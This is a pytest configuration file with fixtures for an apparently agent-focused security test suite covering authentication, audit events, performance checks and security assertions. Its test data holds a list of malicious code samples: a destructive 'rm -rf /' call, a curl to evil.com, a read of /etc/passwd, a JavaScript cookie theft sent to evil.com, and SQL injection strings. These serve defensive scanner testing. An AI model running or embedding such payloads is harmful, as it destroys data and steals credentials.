#!/usr/bin/env python3
"""
OSSA Security Test Suite Configuration

Pytest configuration and fixtures for OSSA security tests.
Provides common fixtures, test configuration, and security test utilities.
"""

import pytest
import asyncio
import secrets
import tempfile
import os
import shutil
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Any, Generator
from unittest.mock import Mock, patch
import logging

# Configure logging for tests
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture
def temp_directory() -> Generator[Path, None, None]:
    """Create a temporary directory for test files"""
    temp_dir = tempfile.mkdtemp(prefix="ossa_security_test_")
    try:
        yield Path(temp_dir)
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

@pytest.fixture
def mock_config() -> Dict[str, Any]:
    """Mock OSSA configuration for testing"""
    return {
        "security": {
            "authentication": {
                "methods": ["api_key", "oauth2_pkce", "saml_2_0", "mTLS"],
                "default": "oauth2_pkce",
                "mfa_required": True,
                "session_timeout": 3600,  # 1 hour
                "token_expiry": 86400     # 24 hours
            },
            "authorization": {
                "model": "rbac_abac_hybrid",
                "fine_grained_permissions": True,
                "context_aware": True
            },
            "encryption": {
                "at_rest": "aes_256_gcm",
                "in_transit": "tls_1_3",
                "key_management": "hsm_backed"
            },
            "audit": {
                "enabled": True,
                "comprehensive_logging": True,
                "immutable_audit_trail": True,
                "hash_chain_verification": True,
                "retention_policy": "7_years",
                "compliance_reporting": "automated"
            },
            "trust_scoring": {
                "enabled": True,
                "decay_enabled": True,
                "decay_half_life_days": 30,
                "privacy_protection": True,
                "differential_privacy_epsilon": 1.0
            },
            "malicious_protection": {
                "code_scanning": True,
                "behavior_monitoring": True,
                "resource_limits": True,
                "sandboxing": True,
                "communication_security": True
            }
        },
        "performance": {
            "sla": {
                "availability": "99.99%",
                "latency": {
                    "health_check": 50,      # ms
                    "authentication": 200,   # ms
                    "authorization": 100,    # ms
                    "audit_logging": 500     # ms
                }
            },
            "limits": {
                "max_concurrent_sessions": 1000,
                "max_events_per_second": 10000,
                "max_memory_per_agent_mb": 512,
                "max_cpu_per_agent_percent": 50
            }
        }
    }

@pytest.fixture
def security_test_data() -> Dict[str, Any]:
    """Common test data for security tests"""
    return {
        "valid_agent_ids": [
            "compliance_auditor",
            "data_processor", 
            "system_monitor",
            "workflow_coordinator"
        ],
        "invalid_agent_ids": [
            "",
            None,
            "invalid/agent/id",
            "agent_with_very_long_name_that_exceeds_limits_" + "x" * 100
        ],
        "malicious_code_samples": {
            "python": [
                "import os; os.system('rm -rf /')",
                "__import__('subprocess').call(['curl', 'evil.com'])",
                "exec(open('/etc/passwd').read())",
                "eval(input())"
            ],
            "javascript": [
                "document.location='http://evil.com/steal?cookie='+document.cookie",
                "require('child_process').exec('malicious_command')",
                "eval(atob('bWFsaWNpb3VzX2NvZGU='))"
            ],
            "sql": [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "1; DELETE FROM accounts WHERE 1=1; --"
            ]
        },
        "resource_limits": {
            "normal": {
                "cpu_percent": 15.0,
                "memory_mb": 256,
                "network_kb_per_min": 1024,
                "disk_io_kb_per_min": 5120
            },
            "excessive": {
                "cpu_percent": 95.0,
                "memory_mb": 4096,
                "network_kb_per_min": 102400,
                "disk_io_kb_per_min": 512000
            }
        },
        "trust_score_ranges": {
            "untrusted": (0.0, 0.2),
            "low": (0.2, 0.4),
            "medium": (0.4, 0.7),
            "high": (0.7, 0.9),
            "verified": (0.9, 1.0)
        }
    }

@pytest.fixture
def mock_crypto_keys():
    """Generate mock cryptographic keys for testing"""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    
    # Generate RSA key pair
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    
    # Generate symmetric keys
    hmac_key = secrets.token_bytes(32)  # 256-bit key
    aes_key = secrets.token_bytes(32)   # 256-bit key
    
    return {
        "rsa_private": private_key,
        "rsa_public": public_key,
        "hmac_key": hmac_key,
        "aes_key": aes_key
    }

@pytest.fixture
def security_event_factory():
    """Factory for creating security test events"""
    def create_event(event_type: str = "test", severity: str = "info", **kwargs):
        from .test_audit_trail_security import AuditEvent, AuditEventType, AuditSeverity
        
        event_types = {
            "auth": AuditEventType.AGENT_AUTHENTICATION,
            "access": AuditEventType.DATA_ACCESS,
            "violation": AuditEventType.SECURITY_VIOLATION,
            "compliance": AuditEventType.COMPLIANCE_CHECK,
            "test": AuditEventType.DATA_ACCESS
        }
        
        severities = {
            "info": AuditSeverity.INFO,
            "warning": AuditSeverity.WARNING,
            "error": AuditSeverity.ERROR,
            "critical": AuditSeverity.CRITICAL
        }
        
        default_values = {
            "event_id": f"test_event_{secrets.token_hex(4)}",
            "event_type": event_types.get(event_type, AuditEventType.DATA_ACCESS),
            "severity": severities.get(severity, AuditSeverity.INFO),
            "timestamp": datetime.utcnow(),
            "agent_id": f"test_agent_{secrets.token_hex(4)}",
            "user_id": f"test_user_{secrets.token_hex(4)}",
            "action": "test_action",
            "resource": "/test/resource",
            "outcome": "success",
            "metadata": {}
        }
        
        # Override defaults with provided kwargs
        default_values.update(kwargs)
        
        return AuditEvent(**default_values)
    
    return create_event

@pytest.fixture
def performance_monitor():
    """Performance monitoring fixture for security tests"""
    import time
    import psutil
    
    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.start_memory = None
            self.start_cpu = None
            self.process = psutil.Process()
        
        def start_monitoring(self):
            """Start performance monitoring"""
            self.start_time = time.time()
            self.start_memory = self.process.memory_info().rss
            self.start_cpu = self.process.cpu_percent()
        
        def get_metrics(self):
            """Get current performance metrics"""
            if self.start_time is None:
                return None
            
            current_time = time.time()
            current_memory = self.process.memory_info().rss
            current_cpu = self.process.cpu_percent()
            
            return {
                "elapsed_time": current_time - self.start_time,
                "memory_usage_mb": (current_memory - self.start_memory) / 1024 / 1024,
                "cpu_usage_percent": current_cpu,
                "memory_total_mb": current_memory / 1024 / 1024
            }
        
        def assert_performance_limits(self, max_time: float = None, max_memory_mb: float = None):
            """Assert performance is within limits"""
            metrics = self.get_metrics()
            if metrics is None:
                pytest.fail("Performance monitoring not started")
            
            if max_time and metrics["elapsed_time"] > max_time:
                pytest.fail(f"Test too slow: {metrics['elapsed_time']:.2f}s > {max_time}s")
            
            if max_memory_mb and metrics["memory_usage_mb"] > max_memory_mb:
                pytest.fail(f"Memory usage too high: {metrics['memory_usage_mb']:.2f}MB > {max_memory_mb}MB")
    
    return PerformanceMonitor()

@pytest.fixture
def security_assertion_helpers():
    """Helper functions for security assertions"""
    class SecurityAssertions:
        @staticmethod
        def assert_secure_string(value: str, min_entropy: int = 32):
            """Assert string has sufficient entropy for security"""
            if not value or len(value) < min_entropy:
                pytest.fail(f"String too short for security: {len(value)} < {min_entropy}")
            
            # Check character diversity
            unique_chars = len(set(value))
            if unique_chars < min_entropy // 4:
                pytest.fail(f"Insufficient character diversity: {unique_chars}")
        
        @staticmethod
        def assert_valid_hash(hash_value: str, algorithm: str = "sha256"):
            """Assert hash value is valid for the specified algorithm"""
            expected_lengths = {
                "md5": 32,
                "sha1": 40, 
                "sha256": 64,
                "sha512": 128
            }
            
            expected_length = expected_lengths.get(algorithm.lower())
            if not expected_length:
                pytest.fail(f"Unknown hash algorithm: {algorithm}")
            
            if len(hash_value) != expected_length:
                pytest.fail(f"Invalid {algorithm} hash length: {len(hash_value)} != {expected_length}")
            
            if not all(c in '0123456789abcdef' for c in hash_value.lower()):
                pytest.fail(f"Invalid {algorithm} hash characters")
        
        @staticmethod
        def assert_timestamp_recent(timestamp: datetime, max_age_seconds: int = 300):
            """Assert timestamp is recent (within max_age_seconds)"""
            age = datetime.utcnow() - timestamp
            if age.total_seconds() > max_age_seconds:
                pytest.fail(f"Timestamp too old: {age.total_seconds()}s > {max_age_seconds}s")
        
        @staticmethod
        def assert_no_sensitive_data(data: str, sensitive_patterns: List[str] = None):
            """Assert data doesn't contain sensitive information"""
            if sensitive_patterns is None:
                sensitive_patterns = [
                    r'password',
                    r'secret',
                    r'key',
                    r'token',
                    r'api[_-]?key',
                    r'credential',
                    r'private',
                    r'\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}',  # Credit card pattern
                    r'\d{3}-\d{2}-\d{4}'  # SSN pattern
                ]
            
            import re
            for pattern in sensitive_patterns:
                if re.search(pattern, data, re.IGNORECASE):
                    pytest.fail(f"Sensitive data pattern found: {pattern}")
    
    return SecurityAssertions()

# Test markers for organizing security tests
pytest.mark.authentication = pytest.mark.authentication
pytest.mark.authorization = pytest.mark.authorization  
pytest.mark.trust_scoring = pytest.mark.trust_scoring
pytest.mark.malicious_protection = pytest.mark.malicious_protection
pytest.mark.audit_trail = pytest.mark.audit_trail
pytest.mark.performance = pytest.mark.performance
pytest.mark.integration = pytest.mark.integration
pytest.mark.slow = pytest.mark.slow

# Custom pytest configuration
def pytest_configure(config):
    """Configure pytest with custom markers"""
    config.addinivalue_line("markers", "authentication: Authentication framework tests")
    config.addinivalue_line("markers", "authorization: Authorization system tests")
    config.addinivalue_line("markers", "trust_scoring: Trust scoring system tests")
    config.addinivalue_line("markers", "malicious_protection: Malicious agent protection tests")
    config.addinivalue_line("markers", "audit_trail: Audit trail security tests")
    config.addinivalue_line("markers", "performance: Performance and scalability tests")
    config.addinivalue_line("markers", "integration: Integration tests")
    config.addinivalue_line("markers", "slow: Slow-running tests")

def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers automatically"""
    for item in items:
        # Add markers based on test file names
        if "authentication" in item.nodeid:
            item.add_marker(pytest.mark.authentication)
        elif "trust_scoring" in item.nodeid:
            item.add_marker(pytest.mark.trust_scoring)
        elif "malicious_agent" in item.nodeid:
            item.add_marker(pytest.mark.malicious_protection)
        elif "audit_trail" in item.nodeid:
            item.add_marker(pytest.mark.audit_trail)
        
        # Add performance marker to tests with "performance" in name
        if "performance" in item.name.lower():
            item.add_marker(pytest.mark.performance)
            item.add_marker(pytest.mark.slow)

@pytest.fixture(autouse=True)
def security_test_isolation():
    """Ensure test isolation for security tests"""
    # Clear any global state before each test
    yield
    # Clean up after each test

# Timeout configuration for security tests
@pytest.fixture(scope="session", autouse=True)
def configure_timeouts():
    """Configure timeouts for security tests"""
    import signal
    
    def timeout_handler(signum, frame):
        pytest.fail("Test timed out - potential infinite loop or deadlock")
    
    # Set default timeout for all tests (5 minutes)
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(300)
    
    yield
    
    # Cancel timeout
    signal.alarm(0)